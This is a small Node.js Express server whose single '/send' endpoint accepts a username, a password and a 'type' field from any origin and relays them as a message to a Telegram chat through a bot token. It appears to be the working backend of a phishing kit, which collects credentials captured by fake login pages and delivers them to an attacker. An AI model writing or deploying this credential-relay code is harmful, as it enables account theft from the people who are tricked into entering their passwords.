const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/send", async (req, res) => {
  const { user, pass, type } = req.body;

  if (!user || !pass || !type) {
    return res.status(400).json({ error: "Missing required fields: user, pass, type" });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ error: "Telegram credentials not configured" });
  }

  const message = `New Request:\nUser: ${user}\nPass: ${pass}\nType: ${type}`;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });

    res.json({ success: true, message: "Sent to Telegram successfully" });
  } catch (err) {
    const telegramError = err.response?.data?.description || err.message;
    console.error("Telegram error:", telegramError);
    res.status(500).json({ error: "Failed to send message to Telegram", details: telegramError });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
